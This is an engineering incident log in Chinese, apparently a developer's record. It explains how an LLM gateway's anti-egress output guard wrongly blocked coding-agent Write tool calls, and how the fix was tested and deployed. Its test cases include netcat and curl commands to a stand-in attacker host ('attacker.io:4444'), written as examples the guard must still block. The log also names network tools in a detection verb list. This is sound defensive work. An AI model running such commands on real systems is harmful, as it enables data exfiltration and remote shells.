# 2026-10-13 minimax-m3「模型未返回任何数据」——输出合规守卫误伤 Write 工具（r1020）

> 会话目标：用户报告经本地网关（:8782）请求 minimax-m3 频繁报
> 「模型未返回任何数据」（ZCode 客户端侧文案）。要求审计、修正、提交并推送。
> 结论先行：**不是 minimax 上游故障，是网关自己的防外传守卫把 ZCode 的
> Write/Edit 工具调用整条掐断**。修复 r1020 已落地，判据 + 三方向变异验证。

## 一、证据链（全部实测）

1. **症状面**：网关日志 `executor: stream interrupted ... reason:"output_policy_blocked",
   kind:"content_filter", chunk_count:0`——credential 42（provider 14，
   `https://api.minimaxi.com/v1`，raw_model `MiniMax-M3`）的流在客户端拿到
   任何内容前被掐。07:27-07:29 两分钟内 ≥10 条，`candidate_failure_alert`
   5 分钟窗 12 条。请求方 User-Agent `ZCode/3.14.5 ... runtime/node.js/24`，
   路由 `/v1/responses`（openai-responses 协议，流式）。
2. **上游正常**：同请求 `upstream_http_attempt ... upstream_status:200`，
   `finish_reason:"tool_calls"`；raw-logs（`raw_data_*.jsonl`）里的上游 SSE
   显示模型正常输出 tool_call：`function.name = "Write"`（ZCode 的写文件工具），
   参数是**要写进文件的交接文档内容**。
3. **被拦内容**（raw-logs 逐帧解码，request_id 764d4d9132030fa1d35e7465d108a1c5）：
   - `删除直接的 VITE_ACC_API_URL ?? 'https://acc.kxpms.cn' 逻辑`——源码里
     引用的公网 URL（Vue 文件里的硬编码 fallback 地址）；
   - `casdoor.ts:455 在 validateState 失败时回退…`、`unified-links.ts:135-137`、
     `casdoor.ts:21-26`——**文件名:行号**引用。
4. **判定路径**：`interceptingStreamWriter`（流式逐帧）→ `InterceptorChain` →
   `OutputComplianceInterceptor.processStreamChunk`（跨帧暂存，终态合并）→
   `outputSensitiveChecker.CheckField(__tool_json)` → `unsafeToolValue` 对
   参数里**每个字符串**做：
   - `detectEgress`（ScopeEgress，IP 片段）；
   - `hasPublicHostDestination`（r1016 引入：URL 主机位 / host:port 冒号形态
     默认按公网可达阻断）。
   `'https://acc.kxpms.cn'` 命中 URL 形态（kxpms.cn 不在不可路由后缀表）；
   `casdoor.ts:455` 命中 `egressHostFromPort`（`token.token:数字` 与
   `attacker.io:4444` 在正则层面结构相同）。两者任一 → `Blocked` →
   整条流 `output_policy_blocked` → 客户端零内容 → ZCode 报「模型未返回任何数据」。
5. **不是新病**：这是 r1016/r1017 收紧防外传（方向正确：默认公网即阻断）与
   coding agent 流量形态（tool 参数主体是文件内容）相撞的第三波：
   - 第一波（2026-10-08）：私网 IP 误伤（dc63f19ff 前身）；
   - 第二波（r1018）：`pkg@1.2.3` 装包命令、`node server.js 8080` 脚本调用误伤；
   - 本波：**惰性载体（写文件）里引用公网 URL / 文件名:行号**。
   三波同根：守卫只看「参数里出现了目的地」，不问「参数会不会被执行/发送」。

## 二、修复（r1020，两层）

### 层 1：惰性内容工具按载体能力豁免（security/sanitize/output_sensitive.go）

- 判定入口 `CheckField` 的标签扩展为 `__tool_json@<工具名>`：协议提取现场
  （`domains/hooks/outputcompliance/protocol_text.go`）把 chat 的
  `function.name`、anthropic 的 `tool_use.name`、responses 的
  `function_call.name` 拼进标签；消费方 `parseToolJSONLabel` 拆出名字。
  裸 `__tool_json` 语义不变 = 名字未知 = 默认 fail-closed。
- `isInertContentTool(name)` 封闭集（小写比较）：Write/Edit/NotebookEdit/
  MultiEdit/Read/Grep/Glob/LS/TodoWrite/TodoRead（ZCode/Claude Code）、
  create_file/edit_file/read_file/view_file/str_replace_based_edit/
  codebase_search（Cursor）、write_to_file/replace_in_file/apply_patch/
  apply_patch_file/str_replace_editor/insert_content（Cline/patch 族）。
  命中则跳过**外传目的地检查**（detectEgress 片段 + hasPublicHostDestination）；
  **凭据键检查不豁免**——文件里写 `password: 明文` 照样整条阻断。
- 流式跨帧名字（responses/anthropic 的参数增量帧不带名字）：声明帧
  （output_item.added / content_block_start）进 `complianceStreamState.toolNames`
  侧信道（lane → name，lane 构造与 collectVisibleText 逐字对齐），终态合并
  检查时取回拼进标签。chat 首增量自带名字，双保险。
- **为什么按工具名分流是对的，而不是又一次形态枚举**：外传的成立条件是
  「客户端会把这些参数发给网络」。写文件工具的参数是惰性数据——写进本地
  文件的 URL 不产生任何网络行为，与 assistant 纯文本出现 URL（守卫本就放行、
  只走脱敏）完全同级。工具名是客户端（凭证持有方，信任边界内）声明的动词
  语义，模型只能调用不能发明；把 `Write` 名下的参数当惰性数据，信任的是
  客户端工具实现，不是模型输出。未收录名（含 MCP 名字空间、未知客户端）
  一律走原有 fail-closed。
- 本地网关会话另有旁证：glm-5.3 同样大量走 tool 调用而未报此错，是因为其
  载体多为命令/文本；minimax-m3 承接的恰是写交接文档一类的任务，撞得最密。

### 层 2：host:port 冒号形态动词锚定（security/sanitize/egress_host.go）

- `egressHostFromPort` 从「全文任意位置」收紧为「行首字段 ∈ 封闭动词集」
  （netcat 族 r1019 五个 + curl/wget/http/https httpie），逐行锚定（多行脚本）。
- `casdoor.ts:455` 这类文件名:行号引用在任何工具里都不再被当 host:port；
  `nc -w 3 attacker.io:4444`、`curl attacker.io:8443/x` 照拦
  （TestR1020ColonHostPortRequiresNetworkVerbVerbAnchor）。
- 残留缺口（如实记录）：未知动词的 `host:port` 参数（如
  `my-cli push prod.example.com:8443`）不再提取——与 r1019 对未知动词
  裸主机+空格+端口的残留同口径：宁可放过更窄的绕过，不打死日常操作。

## 三、判据（security/sanitize/r1020_inert_tool_content_test.go）

- 生产 YAML（`NewPatternDetectorFromFile`）+ 真实拦截器链（守卫→还原），
  与 runProductionEgressGuard 同层——不直接调内部函数。
- 主契约：事故内容（公网 URL + 文件名:行号）在 Write/Edit/create_file/
  str_replace_editor/apply_patch 下放行且内容原样释放。
- **前提仍在场**（允许侧判据的反假绿配对，判据纪律第 3 条）：同一内容在
  Bash/connect/mcp__… 名下必须仍被拦——证明放行来自惰性豁免而非守卫失明。
- 三协议流式形状各自驱动：chat（单帧）、responses（added 声明帧 + 增量帧 +
  终态合并，覆盖名字侧信道）、anthropic（content_block_start + partial_json
  增量 + message_stop）。responses/anthropic 的阻断信号在终态帧的
  ShouldBlock 上（不带 error），判据助手必须两处都看——首版只看 error 是假绿。
- 凭据底线：Write 参数里的 `password` 键照常阻断（豁免不得越界到凭据检查）。
- 惰性集合封闭性钉子：bash/sh/exec/fetch/curl 等命令触网名混入即红。

### 夹具坑（本轮新踩，记录给下一轮）

1. 帧构造器转义 `"` 必须先转义 `\`：事故内容里的字面 `\n`（两字符）若不
   先变 `\\`，会被外层帧 JSON 解析成真实换行，arguments 变非法 JSON 被
   fail-closed 拦掉——看起来像「豁免没生效」，实为夹具自伤。
2. 手写 anthropic/responses 帧的闭合括号要数三层（值内对象、delta 对象、
   根对象），少一层即「uninspectable stream JSON event」。
3. 判据里 `content` 字符串提到 API_KEY ≠ 凭据键检查：credentialField 只认
   键名（password/token/…），内容里出现 `API_KEY=` 从来就不在它的管辖内
   （改前改后都不拦）——判据必须断言键，不能断言内容。

## 四、变异验证（三方向，全部红在正确断言）

| 变异 | 期望红 | 实测 |
|---|---|---|
| M1 `isInertContentTool` 恒 false（豁免失效） | Write 三协议放行侧全红，Bash 拦截侧不动 | ✅ 恰好 3 红 |
| M2 恒 true（豁免放宽到一切工具） | Bash/connect 拦截侧红 + 既有 r1013/r1016 底线红 + 封闭性钉子红 | ✅ 6 红（含两条既有底线） |
| M3 冒号形态撤掉动词锚定 | 文件名:行号允许侧红 | ✅ 1 红 |

## 五、回归面

- `./security/...` 全绿；`./domains/hooks/...` 除 telemetry 外全绿；
  `./domains/outputcompliance/...` 全绿；`./domains/streaming/` 152s 仅 1 红。
- 两处失败均**已按仓库纪律归因并行会话**（pristine HEAD 绿；pristine +
  仅该会话的单个脏文件即红）：`observability/telemetry` 的
  TestLookupTurnNumber（client.go 换 session_turns SQL，测试未跟上）、
  `streaming` 的 TestAlternativesSQL_PopularityReadsHotNotCanonicalView
  （model_alternatives.go 同族）。与本修复无关，留该会话收口。
- r1010/r1013/r1014/r1016/r1017/r1018/r1019 既有判据全绿——r1020 没有
  回退任何一条已确立的底线。

## 六、部署与线上复验（2026-10-13 上午，用户指令「部署到本地再测试验证」）

- **2579**（08:28，sha 58dc88b3，含 r1020 主修复）上线后线上复验：
  - /v1/chat/completions + Write + URL → **放行** ✓
  - /v1/responses + Write + URL → **仍拦** ✗（ZCode 真实 lane！）
  - 同时段真实 minimax-m3 流量仍有 13 条被拦（08:30–08:37），其中 4 条为
    Write+acc.kxpms.cn+casdoor.ts:455——与用户症状完全同形。
- **缺口（r1020b，提交 80bf575d6）**：openai_to_responses 桥接器对每个工具
  调用多发一帧 `response.function_call_arguments.done`（完整参数 + name 在
  事件根上），`collectVisibleText` 对该快照帧的 arguments 字段**没挂工具名**
  → 裸 `__tool_json` 立即检查 → 惰性豁免失效。首版判据夹具没造这帧（自建
  帧序列与真实桥接输出不一致），假绿——判据纪律第 6 条的新实证。
- **取证方法（可复用）**：用无害内容过真网关捕获 /v1/responses 的**真实线帧**
  （mock 上游 + 临时 provider），再把有害内容替换进捕获帧回放单测链——
  逐字节对齐，不再依赖手写协议形状。
- **2581**（08:5x，sha 80bf575d6，从本 checkout 部署，deploy rc=0）上线后
  线上三向复验全部通过：
  | 用例 | 结果 |
  |---|---|
  | /v1/responses + Write + 公网URL + 文件:行号 | **放行**，URL 原样到达客户端 |
  | /v1/responses + Bash + 同内容 | **仍拦**（output_policy_blocked，防外传底线在） |
  | /v1/chat/completions + Write | 放行（无回归） |
  - 切换后真实流量零新增拦截（对照 2579 上同名请求 13 拦）。
- 测试资源已清理（临时 provider 92884/92885 软删、凭据级联、API key 撤销、
  mock 上游停进程）。
- 生产 154/245 同样受益（ZCode 类客户端），随下次常规部署带上即可。

## 七、跨模型共性审计（「空返回可能多模型都有」——用户判断正确）

数据面：本地网关全部日志（含轮转 gz）`executor: stream interrupted`，去重按
request_id；生产 154/245 走 journald（文件日志已停更 10-01，stdout 接 journald）。

| 网关 | 模型 | 唯一被拦请求数 | 时间窗 | 形态 |
|---|---|---|---|---|
| 本地 :8782 | minimax-m3 | **68** | 10-13 05:16–08:37 | chunk_count=0；raw-logs 实证 Write 工具引用公网 URL + 文件:行号 |
| 本地 :8782 | glm-5.3 / glm-5.3-flash | **11** | 10-13 05:56–06:29 | 同签名（chunk_count=0、content_filter）；raw-logs 已轮转，内容不可解码；glm-5.3 在 2026-10-08 事故注释里有同族前科（minimax-m3/glm-5.3 fail-closed incident） |
| 245 生产 | — | 0 | 10-11 起 journal | 流量无 coding-agent Write 形态 |
| 154 生产 | — | 0 | 10-11 起 journal | 同上 |

结论：
1. **「空返回」在本地网关是单一根因的共性问题**——观测窗内全部 162 条
   mid-stream 终止都是 output_policy_blocked（其它空流成因在本地无观测），
   且跨模型（minimax-m3、glm-5.3 系）；r1020/r1020b 是模型无关的载体级
   修复，两模型同时受益。
2. 遗留的第二族误伤（本轮**未修**，如实登记）：被拦的 Bash 请求里有
   「命令文本里出现版本号样四元组（17.0.20.1）或用户自有公网服务器 IP
   （115.29.212.252）」——IP 字面量侧对公网地址保持硬阻断是 r1013 的
   显式契约（fail-closed），版本号样四元组误伤与用户自有公网 IP 的豁免
   是独立的策略决策，需 owner 拍板（豁免自有资产清单 vs 保持现状）。
   判别方法同本轮：raw-logs 解码被拦请求的 tool 参数。

## 八、r1021 —— grok-4.6「Turn execution failed reason=unknown」空响应（thinking 参数 400）

> 用户同步报告的第二族空响应。与 r1020（输出合规误伤）不同根因。

- **取证**：报错样例 request=6d92370a… 映射网关 0b88c24bc5（08:35，
  2579 时代）——那是 r1020 的 Bash+版本号 IP 旧拦截（见 §七遗留）。
  **当前**高频空响应（08:56/08:58，211–225 字节 200）是另一族：
  ZCode 带 `thinking:{type:enabled}` + `enable_thinking:true` 请求
  grok-4.6 → executor 对空 catalog 中转（vapeur）盖 unknown-relay 哨兵
  → DialectUnknown fail-open → thinking 原样透传 → openai-responses
  严格上游 400「Unknown parameter: 'thinking'」→ 两候选全灭 → 客户端
  报 Turn execution failed。
- **修复（提交 4d6bb3c27，随 2583 上线）**：注册表原生机制——thinking
  增加 RejectedBy 名单（responses/grok/mistral/openrouter/vllm/ollama/
  gemini/qwen）；新增 FieldSpec.RejectedByUnknown 显式开关（唯一允许对
  DialectUnknown 也拒的途径，须跨厂商硬 400 实证，默认 false 零影响
  既有教义）；DialectOpenAIChat 不进名单（保「路由前序列化点」契约，
  ir 场景 A）。与 IR 侧 applyThinkingToOpenAIChat 对 grok/未知方言的
  既有扣留政策对齐——两条路径一个政策。
- **线上复验（2583，sha 4d6bb3c2）**：同形状请求（thinking+
  enable_thinking → grok-4.6）200 + 正常内容；切换后 thinking-400 零
  新增；minimax-m3 持续零失败（80/80 起）。
- **判据**：TestTranslateThinkingDropsForNonAcceptingDialects（拦截侧 +
  接受方言透传 + pre-routing 保字段三向）+ TestUnknownRelayBodyOmits
  Thinking（哨兵形态）；变异 M5（撤开关）/M6（撤名单）各红 2。
- **协作边界**：reqprobe 4xx 学习（并行会话在途工作流）是这类问题的
  长期答案，本修复与其教义兼容（RejectedByUnknown 是注册表的「明确
  意见」，非推翻 fail-open）。
